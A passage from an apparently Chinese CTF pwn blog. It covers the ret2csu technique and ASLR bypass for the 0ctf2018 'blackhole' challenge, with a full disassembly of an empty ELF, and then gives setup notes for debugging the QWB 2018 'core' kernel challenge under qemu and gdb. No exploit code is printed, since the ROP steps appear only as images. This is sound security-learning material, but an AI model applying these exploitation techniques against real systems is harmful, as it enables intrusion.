class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/ctf/0ctf2018/blackhole$ objdump -d empty</span><br><span class="line"></span><br><span class="line">empty：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .init:</span><br><span class="line"></span><br><span class="line">0000000000400390 &lt;_init&gt;:</span><br><span class="line">  400390:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  400394:48 8b 05 5d 0c 20 00 mov    0x200c5d(%rip),%rax        # 600ff8 &lt;_DYNAMIC+0x1d0&gt;</span><br><span class="line">  40039b:48 85 c0             test   %rax,%rax</span><br><span class="line">  40039e:74 05                je     4003a5 &lt;_init+0x15&gt;</span><br><span class="line">  4003a0:e8 2b 00 00 00       callq  4003d0 &lt;__libc_start_main@plt+0x10&gt;</span><br><span class="line">  4003a5:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  4003a9:c3                   retq   </span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">00000000004003b0 &lt;__libc_start_main@plt-0x10&gt;:</span><br><span class="line">  4003b0:ff 35 52 0c 20 00    pushq  0x200c52(%rip)        # 601008 &lt;_GLOBAL_OFFSET_TABLE_+0x8&gt;</span><br><span class="line">  4003b6:ff 25 54 0c 20 00    jmpq   *0x200c54(%rip)        # 601010 &lt;_GLOBAL_OFFSET_TABLE_+0x10&gt;</span><br><span class="line">  4003bc:0f 1f 40 00          nopl   0x0(%rax)</span><br><span class="line"></span><br><span class="line">00000000004003c0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line">  4003c0:ff 25 52 0c 20 00    jmpq   *0x200c52(%rip)        # 601018 &lt;_GLOBAL_OFFSET_TABLE_+0x18&gt;</span><br><span class="line">  4003c6:68 00 00 00 00       pushq  $0x0</span><br><span class="line">  4003cb:e9 e0 ff ff ff       jmpq   4003b0 &lt;_init+0x20&gt;</span><br><span class="line"></span><br><span class="line">Disassembly of section .plt.got:</span><br><span class="line"></span><br><span class="line">00000000004003d0 &lt;.plt.got&gt;:</span><br><span class="line">  4003d0:ff 25 22 0c 20 00    jmpq   *0x200c22(%rip)        # 600ff8 &lt;_DYNAMIC+0x1d0&gt;</span><br><span class="line">  4003d6:66 90                xchg   %ax,%ax</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000004003e0 &lt;_start&gt;:</span><br><span class="line">  4003e0:31 ed                xor    %ebp,%ebp</span><br><span class="line">  4003e2:49 89 d1             mov    %rdx,%r9</span><br><span class="line">  4003e5:5e                   pop    %rsi</span><br><span class="line">  4003e6:48 89 e2             mov    %rsp,%rdx</span><br><span class="line">  4003e9:48 83 e4 f0          and    $0xfffffffffffffff0,%rsp</span><br><span class="line">  4003ed:50                   push   %rax</span><br><span class="line">  4003ee:54                   push   %rsp</span><br><span class="line">  4003ef:49 c7 c0 60 05 40 00 mov    $0x400560,%r8</span><br><span class="line">  4003f6:48 c7 c1 f0 04 40 00 mov    $0x4004f0,%rcx</span><br><span class="line">  4003fd:48 c7 c7 d6 04 40 00 mov    $0x4004d6,%rdi</span><br><span class="line">  400404:e8 b7 ff ff ff       callq  4003c0 &lt;__libc_start_main@plt&gt;</span><br><span class="line">  400409:f4                   hlt    </span><br><span class="line">  40040a:66 0f 1f 44 00 00    nopw   0x0(%rax,%rax,1)</span><br><span class="line"></span><br><span class="line">0000000000400410 &lt;deregister_tm_clones&gt;:</span><br><span class="line">  400410:b8 37 10 60 00       mov    $0x601037,%eax</span><br><span class="line">  400415:55                   push   %rbp</span><br><span class="line">  400416:48 2d 30 10 60 00    sub    $0x601030,%rax</span><br><span class="line">  40041c:48 83 f8 0e          cmp    $0xe,%rax</span><br><span class="line">  400420:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  400423:76 1b                jbe    400440 &lt;deregister_tm_clones+0x30&gt;</span><br><span class="line">  400425:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  40042a:48 85 c0             test   %rax,%rax</span><br><span class="line">  40042d:74 11                je     400440 &lt;deregister_tm_clones+0x30&gt;</span><br><span class="line">  40042f:5d                   pop    %rbp</span><br><span class="line">  400430:bf 30 10 60 00       mov    $0x601030,%edi</span><br><span class="line">  400435:ff e0                jmpq   *%rax</span><br><span class="line">  400437:66 0f 1f 84 00 00 00 nopw   0x0(%rax,%rax,1)</span><br><span class="line">  40043e:00 00 </span><br><span class="line">  400440:5d                   pop    %rbp</span><br><span class="line">  400441:c3                   retq   </span><br><span class="line">  400442:0f 1f 40 00          nopl   0x0(%rax)</span><br><span class="line">  400446:66 2e 0f 1f 84 00 00 nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  40044d:00 00 00 </span><br><span class="line"></span><br><span class="line">0000000000400450 &lt;register_tm_clones&gt;:</span><br><span class="line">  400450:be 30 10 60 00       mov    $0x601030,%esi</span><br><span class="line">  400455:55                   push   %rbp</span><br><span class="line">  400456:48 81 ee 30 10 60 00 sub    $0x601030,%rsi</span><br><span class="line">  40045d:48 c1 fe 03          sar    $0x3,%rsi</span><br><span class="line">  400461:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  400464:48 89 f0             mov    %rsi,%rax</span><br><span class="line">  400467:48 c1 e8 3f          shr    $0x3f,%rax</span><br><span class="line">  40046b:48 01 c6             add    %rax,%rsi</span><br><span class="line">  40046e:48 d1 fe             sar    %rsi</span><br><span class="line">  400471:74 15                je     400488 &lt;register_tm_clones+0x38&gt;</span><br><span class="line">  400473:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  400478:48 85 c0             test   %rax,%rax</span><br><span class="line">  40047b:74 0b                je     400488 &lt;register_tm_clones+0x38&gt;</span><br><span class="line">  40047d:5d                   pop    %rbp</span><br><span class="line">  40047e:bf 30 10 60 00       mov    $0x601030,%edi</span><br><span class="line">  400483:ff e0                jmpq   *%rax</span><br><span class="line">  400485:0f 1f 00             nopl   (%rax)</span><br><span class="line">  400488:5d                   pop    %rbp</span><br><span class="line">  400489:c3                   retq   </span><br><span class="line">  40048a:66 0f 1f 44 00 00    nopw   0x0(%rax,%rax,1)</span><br><span class="line"></span><br><span class="line">0000000000400490 &lt;__do_global_dtors_aux&gt;:</span><br><span class="line">  400490:80 3d 99 0b 20 00 00 cmpb   $0x0,0x200b99(%rip)        # 601030 &lt;__TMC_END__&gt;</span><br><span class="line">  400497:75 11                jne    4004aa &lt;__do_global_dtors_aux+0x1a&gt;</span><br><span class="line">  400499:55                   push   %rbp</span><br><span class="line">  40049a:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  40049d:e8 6e ff ff ff       callq  400410 &lt;deregister_tm_clones&gt;</span><br><span class="line">  4004a2:5d                   pop    %rbp</span><br><span class="line">  4004a3:c6 05 86 0b 20 00 01 movb   $0x1,0x200b86(%rip)        # 601030 &lt;__TMC_END__&gt;</span><br><span class="line">  4004aa:f3 c3                repz retq </span><br><span class="line">  4004ac:0f 1f 40 00          nopl   0x0(%rax)</span><br><span class="line"></span><br><span class="line">00000000004004b0 &lt;frame_dummy&gt;:</span><br><span class="line">  4004b0:bf 20 0e 60 00       mov    $0x600e20,%edi</span><br><span class="line">  4004b5:48 83 3f 00          cmpq   $0x0,(%rdi)</span><br><span class="line">  4004b9:75 05                jne    4004c0 &lt;frame_dummy+0x10&gt;</span><br><span class="line">  4004bb:eb 93                jmp    400450 &lt;register_tm_clones&gt;</span><br><span class="line">  4004bd:0f 1f 00             nopl   (%rax)</span><br><span class="line">  4004c0:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  4004c5:48 85 c0             test   %rax,%rax</span><br><span class="line">  4004c8:74 f1                je     4004bb &lt;frame_dummy+0xb&gt;</span><br><span class="line">  4004ca:55                   push   %rbp</span><br><span class="line">  4004cb:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  4004ce:ff d0                callq  *%rax</span><br><span class="line">  4004d0:5d                   pop    %rbp</span><br><span class="line">  4004d1:e9 7a ff ff ff       jmpq   400450 &lt;register_tm_clones&gt;</span><br><span class="line"></span><br><span class="line">00000000004004d6 &lt;main&gt;:</span><br><span class="line">  4004d6:55                   push   %rbp</span><br><span class="line">  4004d7:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  4004da:89 7d fc             mov    %edi,-0x4(%rbp)</span><br><span class="line">  4004dd:48 89 75 f0          mov    %rsi,-0x10(%rbp)</span><br><span class="line">  4004e1:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  4004e6:5d                   pop    %rbp</span><br><span class="line">  4004e7:c3                   retq   </span><br><span class="line">  4004e8:0f 1f 84 00 00 00 00 nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4004ef:00 </span><br><span class="line"></span><br><span class="line">00000000004004f0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4004f0:41 57                push   %r15</span><br><span class="line">  4004f2:41 56                push   %r14</span><br><span class="line">  4004f4:41 89 ff             mov    %edi,%r15d</span><br><span class="line">  4004f7:41 55                push   %r13</span><br><span class="line">  4004f9:41 54                push   %r12</span><br><span class="line">  4004fb:4c 8d 25 0e 09 20 00 lea    0x20090e(%rip),%r12        # 600e10 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  400502:55                   push   %rbp</span><br><span class="line">  400503:48 8d 2d 0e 09 20 00 lea    0x20090e(%rip),%rbp        # 600e18 &lt;__init_array_end&gt;</span><br><span class="line">  40050a:53                   push   %rbx</span><br><span class="line">  40050b:49 89 f6             mov    %rsi,%r14</span><br><span class="line">  40050e:49 89 d5             mov    %rdx,%r13</span><br><span class="line">  400511:4c 29 e5             sub    %r12,%rbp</span><br><span class="line">  400514:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  400518:48 c1 fd 03          sar    $0x3,%rbp</span><br><span class="line">  40051c:e8 6f fe ff ff       callq  400390 &lt;_init&gt;</span><br><span class="line">  400521:48 85 ed             test   %rbp,%rbp</span><br><span class="line">  400524:74 20                je     400546 &lt;__libc_csu_init+0x56&gt;</span><br><span class="line">  400526:31 db                xor    %ebx,%ebx</span><br><span class="line">  400528:0f 1f 84 00 00 00 00 nopl   0x0(%rax,%rax,1)</span><br><span class="line">  40052f:00 </span><br><span class="line">  400530:4c 89 ea             mov    %r13,%rdx</span><br><span class="line">  400533:4c 89 f6             mov    %r14,%rsi</span><br><span class="line">  400536:44 89 ff             mov    %r15d,%edi</span><br><span class="line">  400539:41 ff 14 dc          callq  *(%r12,%rbx,8)</span><br><span class="line">  40053d:48 83 c3 01          add    $0x1,%rbx</span><br><span class="line">  400541:48 39 eb             cmp    %rbp,%rbx</span><br><span class="line">  400544:75 ea                jne    400530 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">  400546:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  40054a:5b                   pop    %rbx</span><br><span class="line">  40054b:5d                   pop    %rbp</span><br><span class="line">  40054c:41 5c                pop    %r12</span><br><span class="line">  40054e:41 5d                pop    %r13</span><br><span class="line">  400550:41 5e                pop    %r14</span><br><span class="line">  400552:41 5f                pop    %r15</span><br><span class="line">  400554:c3                   retq   </span><br><span class="line">  400555:90                   nop</span><br><span class="line">  400556:66 2e 0f 1f 84 00 00 nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  40055d:00 00 00 </span><br><span class="line"></span><br><span class="line">0000000000400560 &lt;__libc_csu_fini&gt;:</span><br><span class="line">  400560:f3 c3                repz retq </span><br><span class="line"></span><br><span class="line">Disassembly of section .fini:</span><br><span class="line"></span><br><span class="line">0000000000400564 &lt;_fini&gt;:</span><br><span class="line">  400564:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  400568:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  40056c:c3                   retq</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-091806.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-091751.png" alt=""><br>我们把除了application source code之外的其他函数称为The Attached code<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-104551.png" alt=""></p><h3 id="64-bit-ASLR-bypass"><a href="#64-bit-ASLR-bypass" class="headerlink" title="64-bit ASLR bypass"></a>64-bit ASLR bypass</h3><ol><li>手动分析“attached code”，寻找ROP-chain,劫持控制流。</li></ol><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-110704.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-110721.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-110731.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-111109.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-111502.png" alt=""></p><p><strong>blackhole里</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-110833.png" alt=""></p><ol><li>分析plt和got，用urop来leak libc地址</li></ol><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-111629.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-111746.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-113814.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-121318.png" alt=""></p><ol><li>使用libc构造rop-chain<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-121852.png" alt=""></li></ol><h3 id="什么时候我们能使用return-to-csu"><a href="#什么时候我们能使用return-to-csu" class="headerlink" title="什么时候我们能使用return to csu"></a>什么时候我们能使用return to csu</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-122304.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2csu </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>强网杯2018 core环境搭建</title>
      <link href="/2018/03/31/b_core/"/>
      <url>/2018/03/31/b_core/</url>
      <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/%E5%BC%BA%E7%BD%91%E6%9D%AF2018/core_give.tar" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/%E5%BC%BA%E7%BD%91%E6%9D%AF2018/core_give.tar</a></p><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>ubuntu14.04<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ uname -a</span><br><span class="line">Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure></p><p>gdb 7.7.1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ gdb -v</span><br><span class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</span><br></pre></td></tr></table></figure></p><h3 id="下载qemu"><a href="#下载qemu" class="headerlink" title="下载qemu"></a>下载qemu</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu qemu-system</span><br></pre></td></tr></table></figure><h3 id="打开虚拟化"><a href="#打开虚拟化" class="headerlink" title="打开虚拟化"></a>打开虚拟化</h3><p>这个在cpu那里<br>vm版本：<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-30-172405.jpg" alt=""><br>pd版本：<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-30-172455.png" alt=""></p><h3 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h3><p>本来这样应该就可以了，不过有几个坑点我还是要说一下。</p><ul><li>-m megs         set virtual RAM size to megs MB [default=128]<br>原先shell里指定的是64M，这样会GG，起码改成128M，觉得不够还可以加。</li><li>-kernel bzImage use ‘bzImage’ as kernel image<br>指定kernel image</li><li>-initrd file    use ‘file’ as initial ram disk<br>要运行不能只有内核，这里是相当于指定一个硬盘（使用软件将RAM模拟当做硬盘来使用）<br>cpio是一种文件系统，后面解包就看懂了。</li><li>-append cmdline use ‘cmdline’ as kernel command line<br>没什么好说的，调试的时候可以关了kaslr，指定no kaslr</li><li>-s              shorthand for -gdb tcp::1234<br>这东西坑了我很久，意思是-gdb tcp::1234这个命令的缩写，所以你在后面再指定gdb，或者进了monitor（这种方法参考muhe师傅的<a href="https://www.anquanke.com/post/id/85840" target="_blank" rel="noopener">文章</a>,也就是启动时按ctrl+alt+2，反正mac的虚拟机里没法按……我就不这样了）再运行gdbserver都会报 Duplicate ID ‘gdb’ for chardev。</li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-30-172604.png" alt=""></p><p>这样运行shell应该就可以了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-30-174142.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-30-174124.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-30-174156.png" alt=""></p><h3 id="关闭定时power-down"><a href="#关闭定时power-down" class="headerlink" title="关闭定时power down"></a>关闭定时power down</h3><p>类似alarm，如图，直接自己就结束了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-30-174239.jpg" alt=""><br>要改掉这个，也是删掉一个配置就行了，不过这个要在init里改了，如图，就是这句，删掉就好了<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-30-174550.png" alt=""><br>而我们知道实际上这个硬盘是那个cpio文件,所以要删除这句话的话，首先需要解包cpio，删了这句话，然后重新打包。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/Desktop/give_to_player$ ls</span><br><span class="line">bzImage  core.cpio  start.sh  vmlinux</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player$ mkdir core</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player$ mv core.cpio ./core/core.cpio.gz</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player$ cd core</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ ls</span><br><span class="line">core.cpio.gz</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ gunzip core.cpio.gz </span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ ls</span><br><span class="line">core.cpio</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ cpio -idmv &lt; core.cpio</span><br><span class="line">.</span><br><span class="line">bin</span><br><span class="line">bin/ionice</span><br><span class="line">bin/iostat</span><br><span class="line">bin/ipcalc</span><br><span class="line">bin/kbd_mode</span><br><span class="line">bin/linux32</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">root</span><br><span class="line">root/flag</span><br><span class="line">core.ko</span><br><span class="line">tmp</span><br><span class="line">init</span><br><span class="line">vmlinux</span><br><span class="line">104379 blocks</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ ls</span><br><span class="line">bin  core.cpio  core.ko  etc  gen_cpio.sh  init  lib  lib64  linuxrc  proc  root  sbin  sys  tmp  usr  vmlinux</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ rm -rf core.cpio </span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ ls</span><br><span class="line">bin  core.ko  etc  gen_cpio.sh  init  lib  lib64  linuxrc  proc  root  sbin  sys  tmp  usr  vmlinux</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ vim init</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ ./gen_cpio.sh core.cpio</span><br><span class="line">.</span><br><span class="line">./usr</span><br><span class="line">./usr/sbin</span><br><span class="line">./usr/sbin/delgroup</span><br><span class="line">./usr/sbin/i2cdump</span><br><span class="line">./usr/sbin/rtcwake</span><br><span class="line">./usr/sbin/i2cget</span><br><span class="line">./usr/sbin/ubiattach</span><br><span class="line">./usr/sbin/dhcprelay</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">./bin/ping</span><br><span class="line">./bin/busybox</span><br><span class="line">./bin/kbd_mode</span><br><span class="line">./bin/sh</span><br><span class="line">./bin/grep</span><br><span class="line">./bin/base64</span><br><span class="line">./bin/mount</span><br><span class="line">104379 blocks</span><br><span class="line"></span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ ls</span><br><span class="line">bin  core.cpio  core.ko  etc  gen_cpio.sh  init  lib  lib64  linuxrc  proc  root  sbin  sys  tmp  usr  vmlinux</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ mv core.cpio ../core.cpio</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ cd ..</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player$ ls</span><br><span class="line">bzImage  core  core.cpio  start.sh  vmlinux</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player$ rm -rf core</span><br></pre></td></tr></table></figure></p><p>解释一下，上面这些log里最重要的就是cpio的解包和打包。</p><ol><li><p>解包的坑点是cpio文件应该这么解压,先用gunzip，再用cpio -idmv，但是gunzip认后缀不认文件格式，所以我们要先重命名为core.cpio.gz，再cpio -idmv提取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gunzip 文件名.cpio.gz</span><br><span class="line">cpio -idmv &lt; 文件名.cpio</span><br></pre></td></tr></table></figure></li><li><p>打包这个……师傅告诉我里面的gen_cpio.sh就是打包的shell,$1是我们输入的参数，也就是要输出的文件名。<br>比如./gen_cpio.sh core.cpio就代表打包后输出的文件名为core.cpio。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat gen_cpio.sh </span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; $1</span><br></pre></td></tr></table></figure></li></ol><p>可以看到这样就删掉了，就不会2分钟后自动终止了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-30-175856.png" alt=""></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>这样我们的搭建就完成了，看上去不复杂，我还是踩坑踩了一晚上，不过这样qemu+gdb调试kernel其实也会了(我后面应该会写怎么搭建)<br>感谢师傅们指导了QVQ。</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kernel pwn资料整理（更新ing)</title>
      <link href="/2018/03/29/kernel/"/>
      <url>/2018/03/29/kernel/</url>
